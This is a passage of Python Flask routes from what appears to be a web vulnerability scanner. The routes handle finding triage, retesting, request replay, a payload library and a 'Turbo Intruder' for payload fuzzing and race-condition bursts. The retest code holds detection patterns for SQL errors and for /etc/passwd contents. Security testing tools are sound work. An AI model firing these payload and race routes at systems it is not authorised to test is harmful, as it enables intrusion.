            endpoints[url] = {
                "url":          url,
                "findings":     [],
                "count":        0,
                "top_severity": "info",
            }
        ep = endpoints[url]
        ep["count"] += 1
        fsev = (f.get("severity") or "info").lower()
        ep["findings"].append({
            "finding":    f.get("finding", ""),
            "severity":   fsev,
            "type":       f.get("type") or f.get("category") or "unknown",
            "agent":      f.get("agent", ""),
            "icon":       f.get("icon", "🔍"),
            "phase":      f.get("phase", ""),
            "proof":      f.get("proof", ""),
            "param":      f.get("param", ""),
            "payload":    f.get("payload", ""),
            "cwe":        f.get("cwe", ""),
        })
        if SEV_RANK.get(fsev, 4) < SEV_RANK.get(ep["top_severity"], 4):
            ep["top_severity"] = fsev

    result = sorted(endpoints.values(),
                    key=lambda e: SEV_RANK.get(e["top_severity"], 4))
    return jsonify({"endpoints": result, "count": len(result), "total_findings": len(out)})


@app.route("/api/finding-body")
@_login_required
def finding_body():
    """Return the captured resp_body + response_headers for a specific URL from in-memory findings."""
    url = req.args.get("url", "").strip()
    if not url:
        return jsonify({"error": "url required"}), 400
    with _lock:
        # Search _findings for the best match (URL exact, then startswith)
        match = next((f for f in _findings if f.get("url") == url and f.get("resp_body")), None)
        if not match:
            match = next((f for f in _findings if f.get("url", "").startswith(url) and f.get("resp_body")), None)
        # Also search _passive_findings
        if not match:
            match = next((f for f in _passive_findings if f.get("url") == url and f.get("resp_body")), None)
    if not match:
        return jsonify({"resp_body": "", "response_headers": {}})
    return jsonify({
        "resp_body":        match.get("resp_body", ""),
        "response_headers": match.get("response_headers", {}),
        "status_code":      match.get("status_code", 0),
    })


# ══════════════════════════════════════════════════════════════════════════════
# Finding lifecycle / triage (Gap 1 + 2)
# ══════════════════════════════════════════════════════════════════════════════

_VALID_STATUSES = {"open", "triaged", "accepted_risk", "fixed", "wontfix"}

@app.route("/api/findings/<finding_id>/status", methods=["PATCH"])
@_login_required
def finding_update_status(finding_id: str):
    data     = req.json or {}
    status   = data.get("status")
    assignee = data.get("assignee")
    notes    = data.get("notes")
    if status and status not in _VALID_STATUSES:
        return jsonify({"error": f"invalid status — must be one of {sorted(_VALID_STATUSES)}"}), 400
    actor = session.get("user", "anonymous")
    ip    = req.remote_addr
    ok = _db.update_finding_status(finding_id, status=status, assignee=assignee, notes=notes)
    if not ok:
        return jsonify({"error": "finding not found or no fields to update"}), 404
    _db.log_audit("finding_status_changed", scan_id=_active_scan_id,
                  actor=actor, ip=ip,
                  detail=f"finding={finding_id} status={status} assignee={assignee}")
    return jsonify({"success": True, "finding_id": finding_id,
                    "status": status, "assignee": assignee})


@app.route("/api/findings/<finding_id>/comments", methods=["GET"])
@_login_required
def finding_get_comments(finding_id: str):
    row = _db.sql.fetchone("SELECT finding_id FROM findings WHERE finding_id=?", (finding_id,))
    if not row:
        return jsonify({"error": "finding not found"}), 404
    return jsonify({"comments": _db.get_finding_comments(finding_id)})


@app.route("/api/findings/<finding_id>/comments", methods=["POST"])
@_login_required
def finding_add_comment(finding_id: str):
    data   = req.json or {}
    body   = (data.get("body") or "").strip()
    author = data.get("author") or session.get("user", "anonymous")
    if not body:
        return jsonify({"error": "body required"}), 400
    row = _db.sql.fetchone("SELECT finding_id FROM findings WHERE finding_id=?", (finding_id,))
    if not row:
        return jsonify({"error": "finding not found"}), 404
    cid = _db.add_finding_comment(finding_id, body=body, author=author)
    return jsonify({"success": True, "comment_id": cid}), 201


@app.route("/api/findings/<finding_id>/retest", methods=["POST"])
@_login_required
def finding_retest(finding_id: str):
    """Re-fire the original payload against the original URL and report if still vulnerable."""
    row = _db.sql.fetchone(
        "SELECT url, vuln_type, payload, param FROM findings WHERE finding_id=?",
        (finding_id,))
    if not row:
        return jsonify({"error": "finding not found"}), 404

    url       = row["url"] or row[0]
    vuln_type = row["vuln_type"] or row[1] or ""
    payload   = row["payload"] or row[2] or ""
    param     = row["param"] or row[3] or ""

    if not url:
        return jsonify({"error": "no URL recorded for this finding"}), 422

    retest_status = "inconclusive"
    evidence      = {}
    try:
        import requests as _r, time as _t, urllib3
        urllib3.disable_warnings()
        s = _r.Session(); s.verify = False
        s.headers["User-Agent"] = "Mozilla/5.0 (DAST-Retest/1.0)"

        t0   = _t.monotonic()
        resp = s.get(url, timeout=10, allow_redirects=True)
        ms   = round((_t.monotonic() - t0) * 1000, 1)

        body_lower = resp.text.lower()
        # Simple indicator checks per vuln type
        _indicators: dict = {
            "xss":       lambda b, _r: payload.lower() in b if payload else False,
            "sqli":      lambda b, _r: any(x in b for x in
                                           ("sql syntax", "mysql_fetch", "ora-0", "pg_query",
                                            "sqlite_", "you have an error in your sql")),
            "lfi":       lambda b, _r: "root:x:" in b or "[boot loader]" in b,
            "open_redirect": lambda b, r: len(r.history) > 0 and "evil" in r.url,
            "info_disclosure": lambda b, _r: payload.lower() in b if payload else False,
        }
        check_fn = next((fn for k, fn in _indicators.items() if k in vuln_type.lower()), None)
        still_vulnerable = check_fn(body_lower, resp) if check_fn else None

        if still_vulnerable is True:
            retest_status = "still_vulnerable"
        elif still_vulnerable is False:
            retest_status = "fixed"
        else:
            retest_status = "inconclusive"

        evidence = {
            "url": url, "status_code": resp.status_code,
            "resp_time_ms": ms, "resp_length": len(resp.content),
        }
    except Exception as e:
        retest_status = "inconclusive"
        evidence = {"error": str(e)}

    _db.record_retest(finding_id, retest_status)
    _db.log_audit("finding_retested", scan_id=_active_scan_id,
                  actor=session.get("user", "anonymous"), ip=req.remote_addr,
                  detail=f"finding={finding_id} result={retest_status}")
    return jsonify({
        "finding_id":    finding_id,
        "retest_status": retest_status,
        "evidence":      evidence,
    })


# ── Scan coverage (Gap 3) ─────────────────────────────────────────────────────

@app.route("/api/scans/<scan_id>/coverage")
@_login_required
def scan_coverage(scan_id: str):
    return jsonify(_db.get_coverage(scan_id))


# ── Audit log (Gap 4) ─────────────────────────────────────────────────────────

@app.route("/api/audit-log")
@_login_required
def audit_log():
    scan_id = req.args.get("scan_id")
    limit   = min(int(req.args.get("limit", 200)), 1000)
    return jsonify({"audit_log": _db.get_audit_log(scan_id=scan_id, limit=limit)})


# ── Scan comparison (Gap 8) ───────────────────────────────────────────────────

@app.route("/api/scans/<scan_a>/compare/<scan_b>")
@_login_required
def scan_compare(scan_a: str, scan_b: str):
    result = _db.compare_scans(scan_a, scan_b)
    return jsonify(result)


@app.route("/api/scans")
@_login_required
def scans_list():
    limit = min(int(req.args.get("limit", 50)), 200)
    return jsonify({"scans": _db.get_scan_history(limit=limit)})


# ── Integration status (Gap 5) ───────────────────────────────────────────────

@app.route("/api/integrations/status")
@_login_required
def integrations_status():
    import os as _os
    return jsonify({
        "jira":    bool(_os.getenv("JIRA_URL") and _os.getenv("JIRA_TOKEN")),
        "webhook": bool(_os.getenv("WEBHOOK_URL")),
        "sentry":  bool(_os.getenv("SENTRY_DSN")),
        "jira_url":     _os.getenv("JIRA_URL", ""),
        "webhook_url":  _os.getenv("WEBHOOK_URL", ""),
    })


# ── Turbo Intruder ────────────────────────────────────────────────────────────

_intruder_attacks: dict = {}   # attack_id → {engine, started_at}

@app.route("/api/intruder/turbo/launch", methods=["POST"])
@_login_required
def turbo_intruder_launch():
    from modules.turbo_engine import TurboEngine
    data = req.json or {}

    endpoint       = (data.get("endpoint") or "").strip()
    template       = (data.get("template") or "").strip()
    payloads_text  = data.get("payloads_text") or ""
    threads        = max(1, int(data.get("threads", 5)))
    timeout        = max(1, int(data.get("timeout", 10)))
    rpc            = max(1, int(data.get("rpc", 50)))
    race_mode      = bool(data.get("race_mode", False))
    race_count     = max(2, int(data.get("race_count", 20)))
    delay_ms       = float(data.get("delay_ms", 0))

    if not endpoint:
        return jsonify({"error": "endpoint required"}), 400
    if not template:
        return jsonify({"error": "template required"}), 400

    payloads = [p for p in payloads_text.splitlines() if p.strip()]
    if not race_mode and not payloads:
        return jsonify({"error": "payloads required for sniper mode"}), 400

    attack_id = uuid.uuid4().hex[:12]
    engine = TurboEngine(
        endpoint=endpoint,
        template=template,
        payloads=payloads,
        threads=threads,
        requests_per_connection=rpc,
        timeout=timeout,
        race_mode=race_mode,
        race_count=race_count,
        delay_ms=delay_ms,
    )
    _intruder_attacks[attack_id] = {
        "engine":     engine,
        "started_at": datetime.now(timezone.utc).isoformat(),
        "payload_count": len(payloads) if not race_mode else race_count,
    }
    engine.start()
    return jsonify({"attack_id": attack_id, "payload_count": len(payloads)})


@app.route("/api/intruder/turbo/stream/<attack_id>")
@_login_required
def turbo_intruder_stream(attack_id: str):
    from flask import stream_with_context, Response as FlaskResponse
    attack = _intruder_attacks.get(attack_id)
    if not attack:
        return jsonify({"error": "unknown attack"}), 404

    engine = attack["engine"]

    def _generate():
        import json as _j
        try:
            for result in engine.stream_results():
                if result is None:
                    break
                if engine._stop.is_set() and engine._result_q.empty():
                    break
                yield f"data: {_j.dumps(result.to_dict())}\n\n"
        except GeneratorExit:
            engine.stop()
        finally:
            yield 'data: {"done":true}\n\n'

    return FlaskResponse(
        stream_with_context(_generate()),
        content_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@app.route("/api/intruder/turbo/stop", methods=["POST"])
@_login_required
def turbo_intruder_stop():
    data = req.json or {}
    attack_id = data.get("attack_id", "")
    attack = _intruder_attacks.get(attack_id)
    if not attack:
        return jsonify({"error": "unknown attack"}), 404
    attack["engine"].stop()
    return jsonify({"success": True})


@app.route("/api/intruder/turbo/status/<attack_id>")
@_login_required
def turbo_intruder_status(attack_id: str):
    attack = _intruder_attacks.get(attack_id)
    if not attack:
        return jsonify({"error": "unknown attack"}), 404
    stats = attack["engine"].stats
    state = "done" if stats["done"] else ("stopped" if stats["stopped"] else "running")
    return jsonify({**stats, "state": state, "started_at": attack["started_at"]})


@app.route("/api/intruder/turbo/wordlist/<name>")
@_login_required
def turbo_intruder_wordlist(name: str):
    """Return lines of a named DAST wordlist for use in Turbo Intruder payloads."""
    try:
        lines = load_wordlist(name)
        return jsonify({"name": name, "lines": lines, "count": len(lines)})
    except FileNotFoundError:
        return jsonify({"error": f"Wordlist '{name}' not found"}), 404
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/history")
@_login_required
def scan_history():
    limit = int(req.args.get("limit", 20))
    return jsonify({"history": _db_get_history(limit)})

@app.route("/api/history/live", methods=["DELETE"])
@_login_required
def delete_live_scan():
    """Clear in-memory findings (the synthetic 'live' entry). Stops scan if running."""
    global _findings, _passive_findings, _engine_running, _engine_stop_event
    global _seen_findings, _graphql_scan_findings, _ws_scan_findings, _restored_scan_id
    if _engine_running and _engine_stop_event:
        _engine_stop_event.set()
    with _engine_lock:
        _findings.clear()
        _passive_findings.clear()
        _seen_findings.clear()
        _graphql_scan_findings.clear()
        _ws_scan_findings.clear()
        _engine_running = False
        _restored_scan_id = None
    return jsonify({"ok": True})

@app.route("/api/history/<scan_id>", methods=["DELETE"])
@_login_required
def delete_scan_history(scan_id: str):
    scan = _db.get_scan(scan_id) or {}
    target = scan.get("target", "")
    ok = _db_delete_scan(scan_id)
    if ok:
        try:
            _clear_deleted_scan_from_memory(scan_id, target)
        except Exception:
            pass  # delete succeeded; in-memory cleanup is best-effort
    return jsonify({"ok": ok})

@app.route("/api/schedule", methods=["GET"])
@_login_required
def list_schedules():
    return jsonify({"schedules": _db_get_schedules()})

@app.route("/api/schedule", methods=["POST"])
@_login_required
def create_schedule():
    from datetime import timedelta
    data             = req.get_json(silent=True) or {}
    target           = (data.get("target") or "").strip()
    label            = (data.get("label") or target).strip()
    interval_minutes = int(data.get("interval_minutes") or 1440)
    profile          = (data.get("profile") or "default").strip()
    if not target:
        return jsonify({"error": "target required"}), 400
    sched_id = f"sched_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}_{os.urandom(4).hex()}"
    next_run = (datetime.now(timezone.utc) + timedelta(minutes=interval_minutes)).isoformat()
    _db_save_schedule(sched_id, target, label, interval_minutes, profile, next_run)
    return jsonify({"ok": True, "id": sched_id})

@app.route("/api/schedule/<sched_id>", methods=["DELETE"])
@_login_required
def delete_schedule(sched_id: str):
    _db_delete_schedule(sched_id)
    return jsonify({"ok": True})

@app.route("/api/schedule/<sched_id>/toggle", methods=["POST"])
@_login_required
def toggle_schedule(sched_id: str):
    scheds = [s for s in _db_get_schedules() if s["id"] == sched_id]
    if not scheds:
        return jsonify({"error": "not found"}), 404
    new_state = not scheds[0]["enabled"]
    _db_update_schedule(sched_id, enabled=new_state)
    return jsonify({"ok": True, "enabled": new_state})

@app.route("/api/schedule/<sched_id>/run", methods=["POST"])
@_login_required
def run_schedule_now(sched_id: str):
    scheds = [s for s in _db_get_schedules() if s["id"] == sched_id]
    if not scheds:
        return jsonify({"error": "not found"}), 404
    _scheduler_fire(scheds[0])
    return jsonify({"ok": True})


@app.route("/api/logs")
@_login_required
def stream_logs():
    """Return last N lines from the rotating log file."""
    n       = min(int(req.args.get("lines", 200)), 2000)
    level   = req.args.get("level", "").upper()   # filter by level if provided
    search  = req.args.get("q", "").lower()
    lines   = []
    try:
        with open(_LOG_PATH, "r", encoding="utf-8", errors="replace") as f:
            raw = f.readlines()
        # Also include .1 backup if we want more lines
        if len(raw) < n:
            backup = Path(str(_LOG_PATH) + ".1")
            if backup.exists():
                with open(backup, "r", encoding="utf-8", errors="replace") as fb:
                    raw = fb.readlines() + raw
        # Apply filters
        for line in raw:
            if level and f" {level} " not in line and f" {level:<8}" not in line:
                continue
            if search and search not in line.lower():
                continue
            lines.append(line.rstrip("\n"))
        lines = lines[-n:]
    except FileNotFoundError:
        lines = ["[log file not yet created — start a scan to generate logs]"]
    except Exception as exc:
        lines = [f"[error reading log: {exc}]"]
    return jsonify({"lines": lines, "total": len(lines), "log_path": str(_LOG_PATH)})


@app.route("/api/logs/level", methods=["POST"])
@_login_required
def set_log_level():
    """Change log level at runtime without restart."""
    data  = req.get_json(silent=True) or {}
    level = data.get("level", "INFO").upper()
    if level not in ("DEBUG", "INFO", "WARNING", "ERROR"):
        return jsonify({"error": "invalid level"}), 400
    logging.getLogger("dast").setLevel(getattr(logging, level))
    # Also update console handler
    for h in logging.getLogger("dast").handlers:
        if isinstance(h, logging.StreamHandler) and not isinstance(h, logging.FileHandler):
            h.setLevel(getattr(logging, level))
    log.info("Log level changed to %s", level)
    return jsonify({"ok": True, "level": level})


@app.route("/api/logs/clear", methods=["POST"])
@_login_required
def clear_logs():
    """Truncate the log file."""
    try:
        open(_LOG_PATH, "w").close()
        log.info("Log file cleared by user")
        return jsonify({"ok": True})
    except Exception as exc:
        return jsonify({"error": str(exc)}), 500


@app.route("/api/activity")
@_login_required
def scan_activity():
    """Return recent scan activity events (spider, AJAX, passive, engine)."""
    limit = int(req.args.get("limit", 100))
    with _engine_lock:
        events = list(_activity_log[-limit:])
    return jsonify({"events": list(reversed(events)), "count": len(events)})


@app.route("/api/vuln/chains")
@_login_required
def vuln_chains():
    """Return detected attack chains with Mermaid diagram."""
    chains = list(_attack_chains)
    mermaid = chains[0].get("mermaid", "graph LR\n    A[No Chains]") if chains else "graph LR\n    A[No Chains Detected]"
    return jsonify({
        "chains":   chains,
        "total":    len(chains),
        "critical": sum(1 for c in chains if c.get("severity") == "critical"),
        "high":     sum(1 for c in chains if c.get("severity") == "high"),
        "mermaid":  mermaid,
    })


# ── Multi-DB manager routes ────────────────────────────────────────────────────

@app.route("/api/db/stats")
@_login_required
def db_stats():
    """DB health: row counts, sizes, Redis status."""
    return jsonify(_db.get_db_stats())


@app.route("/api/db/history")
@_login_required
def db_history():
    """All scan records from normalised DB — queryable, not just the last 20."""
    limit = min(int(req.args.get("limit", 50)), 500)
    rows = _db.get_scan_history(limit=limit)
    for row in rows:
        scan_id = row.get("scan_id", "")
        custom_name = _scan_name_from_row(row)
        row["name"] = _scan_history_identifier(scan_id, row.get("started_at", ""), custom_name)
        row["custom_name"] = custom_name
        row["short_id"] = (scan_id or "").replace("-", "")[:8]
    return jsonify(rows)


@app.route("/api/db/scan/<scan_id>")
@_login_required
def db_get_scan(scan_id):
    scan = _db.get_scan(scan_id)
    if not scan:
        return jsonify({"error": "not found"}), 404
    return jsonify(scan)


@app.route("/api/db/scan/<scan_id>/findings")
@_login_required
def db_scan_findings(scan_id):
    severity = request.args.get("severity")
    grouped  = request.args.get("grouped", "0")
    limit    = min(int(request.args.get("limit", 2000)), 10000)
    raw      = _db.get_findings(scan_id=scan_id, severity=severity, limit=limit)
    if grouped == "1":
        return jsonify(_group_findings(raw))
    return jsonify(raw)


@app.route("/api/db/scan/<scan_id>/metrics")
@_login_required
def db_scan_metrics(scan_id):
    return jsonify(_db.get_scan_metrics(scan_id))


@app.route("/api/db/compare")
@_login_required
def db_compare_scans():
    """Diff two scans: new, resolved, and persisted findings."""
    a = request.args.get("a")
    b = request.args.get("b")
    if not a or not b:
        return jsonify({"error": "provide ?a=<scan_id>&b=<scan_id>"}), 400
    return jsonify(_db.compare_scans(a, b))


@app.route("/api/db/analytics/top-vulns")
@_login_required
def db_top_vulns():
    limit = min(int(request.args.get("limit", 10)), 50)
    return jsonify(_db.get_top_vulns(limit=limit))


@app.route("/api/db/analytics/targets")
@_login_required
def db_targets_summary():
    return jsonify(_db.get_targets_summary())


@app.route("/api/db/analytics/trend/<vuln_type>")
@_login_required
def db_vuln_trend(vuln_type):
    limit = min(int(request.args.get("limit", 10)), 50)
    return jsonify(_db.get_vuln_trend(vuln_type, limit=limit))


@app.route("/api/db/scan/<scan_id>", methods=["DELETE"])
@_login_required
def db_delete_scan(scan_id):
    scan = _db.get_scan(scan_id) or {}
    ok = _db.delete_scan(scan_id)
    if ok:
        _clear_deleted_scan_from_memory(scan_id, scan.get("target", ""))
    return jsonify({"deleted": ok, "ok": ok})


# ── Raw requests routes ────────────────────────────────────────────────────────

@app.route("/api/requests")
@_login_required
def raw_requests_list():
    """Query raw requests — all sent payloads, fuzzer + intruder + crawler + replay."""
    scan_id     = request.args.get("scan_id")
    source      = request.args.get("source")       # fuzzer|intruder|crawler|replay
    vuln_type   = request.args.get("vuln_type")
    is_finding  = request.args.get("is_finding")   # "true"/"false"
    status_code = request.args.get("status_code")
    url_filter  = request.args.get("url")
    limit       = min(int(request.args.get("limit", 200)), 2000)
    offset      = int(request.args.get("offset", 0))

    if is_finding is not None:
        is_finding = is_finding.lower() == "true"
    if status_code:
        status_code = int(status_code)

    rows = _db.get_raw_requests(
        scan_id=scan_id, source=source, vuln_type=vuln_type,
        is_finding=is_finding, status_code=status_code,
        url_contains=url_filter, limit=limit, offset=offset,
    )
    stats = _db.get_raw_request_stats(scan_id=scan_id)
    return jsonify({"requests": rows, "stats": stats, "count": len(rows)})


@app.route("/api/requests/<request_id>")
@_login_required
def raw_request_detail(request_id):
    row = _db.get_raw_request(request_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify(row)


@app.route("/api/replay/<request_id>", methods=["POST"])
@_login_required
def replay_stored_request(request_id):
    """
    Re-fire a stored raw request.
    Body (optional JSON): { "payload": "new_payload", "headers": {"X-Custom": "val"} }
    """
    body            = req.get_json(silent=True) or {}
    override_payload = body.get("payload")
    override_headers = body.get("headers")
    result = _db.replay_request(
        request_id       = request_id,
        override_payload = override_payload,
        override_headers = override_headers,
        scan_id          = _active_scan_id or "",
    )
    if result and "error" in result:
        return jsonify(result), 400
    return jsonify(result)


@app.route("/api/replay/send", methods=["POST"])
@_login_required
def replay_send_raw():
    """
    Send a completely custom request (not replaying a stored one).
    Body: { url, method, headers, body, payload, parameter, vuln_type }
    """
    data = req.get_json(silent=True) or {}
    url  = data.get("url", "").strip()
    if not url:
        return jsonify({"error": "url required"}), 400
    result = _db.replay_request.__func__(
        _db,
        request_id       = None,
        override_payload = data.get("payload"),
        override_headers = data.get("headers"),
        scan_id          = _active_scan_id or "",
    ) if False else None
    # Direct send path
    import requests as _rlib
    import urllib3; urllib3.disable_warnings()
    import time as _t
    try:
        method  = data.get("method", "GET").upper()
        headers = data.get("headers") or {}
        body    = data.get("body", "")
        payload = data.get("payload", "")
        t0      = _t.monotonic()
        resp    = _rlib.request(method, url, headers=headers,
                                data=body if method not in ("GET","HEAD") else None,
                                timeout=15, verify=False, allow_redirects=False)
        elapsed = (_t.monotonic() - t0) * 1000
        resp_body = resp.text[:8192] if resp.text else ""
        req_id = _db.store_raw_request(
            scan_id=_active_scan_id or "", source="manual",
            url=url, method=method, req_headers=headers, req_body=body,
            payload=payload, parameter=data.get("parameter", ""),
            vuln_type=data.get("vuln_type", ""),
            status_code=resp.status_code, resp_headers=dict(resp.headers),
            resp_body=resp_body, resp_time_ms=elapsed,
            content_length=len(resp.content),
        )
        return jsonify({
            "request_id": req_id, "url": url, "method": method,
            "status_code": resp.status_code,
            "resp_time_ms": round(elapsed, 2),
            "content_length": len(resp.content),
            "resp_body": resp_body,
            "resp_headers": dict(resp.headers),
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Payload library routes ─────────────────────────────────────────────────────

@app.route("/api/payloads")
@_login_required
def payload_library_list():
    """List all payload lists with metadata."""
    category = request.args.get("category")
    libs  = _db.list_payload_libraries(category=category)
    stats = _db.get_payload_stats()
    return jsonify({"libraries": libs, "count": len(libs), "stats": stats})


@app.route("/api/payloads/search")
@_login_required
def payload_search():
    """
    Full-text search across ALL payloads (FTS5 + LIKE fallback).
    ?q=UNION&category=sqli&list_name=sqli_error&sort=hit_count&limit=100&offset=0
    """
    q         = request.args.get("q", "").strip()
    category  = request.args.get("category")
    list_name = request.args.get("list_name")
    source    = request.args.get("source")
    sort      = request.args.get("sort", "hit_count")
    limit     = min(int(request.args.get("limit", 100)), 1000)
    offset    = int(request.args.get("offset", 0))
    results   = _db.search_payloads(q, category=category, list_name=list_name,
                                    source=source, sort=sort, limit=limit, offset=offset)
    return jsonify({"results": results, "count": len(results), "query": q})


@app.route("/api/payloads/stats")
@_login_required
def payload_global_stats():
    """Aggregate stats — total payloads, most effective, by-category breakdown."""
    list_name = request.args.get("list_name")
    return jsonify(_db.get_payload_stats(list_name=list_name))


@app.route("/api/payloads/<name>")
@_login_required
def payload_library_get(name):
    """Get list metadata + paginated payload rows."""
    sort   = request.args.get("sort", "hit_count")
    limit  = min(int(request.args.get("limit", 200)), 2000)
    offset = int(request.args.get("offset", 0))
    libs   = _db.list_payload_libraries()
    meta   = next((l for l in libs if l["name"] == name), None)
    if meta is None:
        return jsonify({"error": "not found"}), 404
    rows = _db.get_payloads_page(name, sort=sort, limit=limit, offset=offset)
    return jsonify({"name": name, "meta": meta, "payloads": rows,
                    "count": len(rows), "total": meta.get("count", 0)})


@app.route("/api/payloads/<name>", methods=["POST", "PUT"])
@_login_required
def payload_library_upsert(name):
    """Create or replace a payload list (bulk upsert)."""
    data     = req.get_json(silent=True) or {}
    payloads = data.get("payloads", [])
    if not isinstance(payloads, list):
        return jsonify({"error": "payloads must be a list"}), 400
    _db.upsert_payload_list(
        name=name, payloads=payloads,
        category=data.get("category", "custom"),
        description=data.get("description", ""),
        source="custom",
    )
    return jsonify({"name": name, "count": len(payloads), "saved": True})


@app.route("/api/payloads/<name>/item", methods=["POST"])
@_login_required
def payload_add_item(name):
    """Add a single payload to a list."""
    data    = req.get_json(silent=True) or {}
    payload = (data.get("payload") or "").strip()
    if not payload:
        return jsonify({"error": "payload required"}), 400
    new_id = _db.add_payload(
        list_name=name,
        payload=payload,
        tags=data.get("tags", []),
        source=data.get("source", "custom"),
    )
    if new_id is None:
        return jsonify({"error": "duplicate — payload already exists in this list"}), 409
    return jsonify({"id": new_id, "list_name": name, "payload": payload, "added": True})


@app.route("/api/payloads/item/<int:item_id>")
@_login_required
def payload_get_item(item_id):
    row = _db.get_payload(item_id)
    if not row:
        return jsonify({"error": "not found"}), 404
    return jsonify(row)


@app.route("/api/payloads/item/<int:item_id>", methods=["PATCH"])
@_login_required
def payload_update_item(item_id):
    """Edit a payload's text or tags."""
    data = req.get_json(silent=True) or {}
    ok   = _db.update_payload(
        item_id,
        payload=data.get("payload"),
        tags=data.get("tags"),
        list_name=data.get("list_name"),
    )
    return jsonify({"updated": ok})


@app.route("/api/payloads/item/<int:item_id>", methods=["DELETE"])
@_login_required
def payload_delete_item(item_id):
    ok = _db.delete_payload(item_id)
    return jsonify({"deleted": ok})


@app.route("/api/payloads/<name>/import", methods=["POST"])
@_login_required
def payload_import(name):
    """
    Import payloads from raw text (newline-separated).
    Accepts plain text body OR JSON {text, category}.
    Handles Burp copy-paste, SecLists, custom wordlists.
    """
    ct   = request.content_type or ""
    if "json" in ct:
        data = req.get_json(silent=True) or {}
        text = data.get("text", "")
        category = data.get("category", "custom")
    else:
        text     = req.get_data(as_text=True) or ""
        category = request.args.get("category", "custom")
    if not text.strip():
        return jsonify({"error": "text body required"}), 400
    added = _db.import_payloads(name, text, category=category, source="imported")
    return jsonify({"name": name, "added": added, "imported": True})


@app.route("/api/payloads/<name>/append", methods=["POST"])
@_login_required
def payload_library_append(name):
    """Append payloads to an existing list (deduped)."""
    data    = req.get_json(silent=True) or {}
    new_pls = data.get("payloads", [])
    if not isinstance(new_pls, list):
        return jsonify({"error": "payloads must be a list"}), 400
    total = _db.append_payloads(name, new_pls)
    return jsonify({"name": name, "total_count": total, "added": len(new_pls)})


@app.route("/api/payloads/<name>", methods=["DELETE"])
@_login_required
def payload_library_delete(name):
    row = _db.sql.fetchone("SELECT source FROM payload_library WHERE name=?", (name,))
    if row and row[0] == "builtin":
        return jsonify({"error": "Cannot delete built-in payload list — delete individual items instead"}), 403
    ok = _db.delete_payload_list(name)
    return jsonify({"deleted": ok})


@app.route("/api/payloads/<name>/shoot", methods=["POST"])
@_login_required
def payload_library_shoot(name):
    """
    Load a payload list and fire it against a target URL+parameter via the Intruder.
    Body: { target_url, method, parameter, attack_mode, grep_match }
    """
    data       = req.get_json(silent=True) or {}
    target_url = (data.get("target_url") or _scan_target or "").strip()
    if not target_url:
        return jsonify({"error": "target_url required"}), 400
    payloads = _db.get_payload_list(name)
    if payloads is None:
        return jsonify({"error": f"Payload list '{name}' not found"}), 404
    if not payloads:
        return jsonify({"error": "Payload list is empty"}), 400

    method    = data.get("method", "GET").upper()
    parameter = data.get("parameter", "q")
    grep_match = data.get("grep_match", "")

    # Build Intruder payload template: inject §param§ marker
    from modules.intruder import Intruder, PayloadSet, AttackMode as _AM
    import requests as _irs

    attack_mode_str = data.get("attack_mode", "sniper").lower()
    mode_map = {"sniper": _AM.SNIPER, "battering_ram": _AM.BATTERING_RAM,
                "pitchfork": _AM.PITCHFORK, "cluster_bomb": _AM.CLUSTER_BOMB}
    attack_mode = mode_map.get(attack_mode_str, _AM.SNIPER)

    # Substitute parameter marker into URL or body
    if method in ("GET", "HEAD"):
        from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
        p = urlparse(target_url)
        qs = parse_qs(p.query, keep_blank_values=True)
        qs[parameter] = [f"\xa7{parameter}\xa7"]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        template_url = urlunparse(p._replace(query=new_query))
        template_body = ""
    else:
        template_url  = target_url
        template_body = f"{parameter}=\xa7{parameter}\xa7"

    intruder = Intruder(
        request_template  = template_url,
        request_body      = template_body,
        attack_mode       = attack_mode,
    )
    intruder.add_payload_set(parameter, payloads[:500])  # cap at 500 per shoot
    if grep_match:
        intruder.set_grep_match(grep_match)

    global _intruder_running, _intruder_results, _intruder_status, _intruder_stop
    if _intruder_running:
        return jsonify({"error": "Intruder already running — stop it first"}), 409

    _intruder_running = True
    _intruder_results = []
    _intruder_status  = f"shooting '{name}' ({len(payloads)} payloads)"
    _intruder_stop    = threading.Event()

    def _shoot_worker():
        global _intruder_running, _intruder_status
        try:
            results = intruder.run(base_url=target_url, method=method, session=_irs.Session())
            result_dicts = [r.to_dict() for r in results]
            _intruder_results.extend(result_dicts)
            # Persist to raw_requests
            raw_rows = []
            for r in result_dicts:
                pv = r.get("payload_values") or {}
                raw_rows.append({
                    "scan_id":        _active_scan_id or "",
                    "source":         "intruder",
                    "url":            r.get("request_url", target_url),
                    "method":         method,
                    "req_body":       r.get("request_body", ""),
                    "payload":        ", ".join(pv.values()),
                    "parameter":      parameter,
                    "status_code":    r.get("response_status", 0),
                    "resp_body":      (r.get("response_body") or "")[:8192],
                    "resp_time_ms":   r.get("latency_ms", 0),
                    "content_length": r.get("response_length", 0),
                    "grep_matches":   r.get("grep_matches", []),
                    "baseline_diff":  r.get("baseline_length_diff", 0),
                    "is_finding":     bool(r.get("grep_matches")),
                })
            _db.bulk_store_raw_requests(raw_rows)
            _intruder_status = f"complete — {len(results)} shots from '{name}'"
        except Exception as e:
            log.error("[Shoot] error: %s", e)
            _intruder_status = f"error: {e}"
        finally:
            _intruder_running = False

    threading.Thread(target=_shoot_worker, daemon=True, name="dast-shoot").start()
    return jsonify({
        "success":      True,
        "payload_list": name,
        "payload_count": min(len(payloads), 500),
        "target_url":   target_url,
        "parameter":    parameter,
        "attack_mode":  attack_mode_str,
    })


@app.route("/api/findings/export")
@_login_required
def findings_export():
    with _lock:
        data = list(_findings)
    return Response(
        json.dumps(data, indent=2),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment; filename=dast_findings.json"},
    )


# ── Remediation + CVSS Knowledge Base ─────────────────────────────────────────

_REMEDIATION: dict = {
    "sqli": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": "9.8",
        "cwe": "CWE-89",
        "fix": "Use parameterised queries / prepared statements. Never concatenate user input into SQL strings. Apply ORM-level protections.",
    },
    "xss": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "score": "6.1",
        "cwe": "CWE-79",
        "fix": "HTML-encode all output. Implement a strict Content-Security-Policy. Use a context-aware output encoding library.",
    },
    "ssrf": {
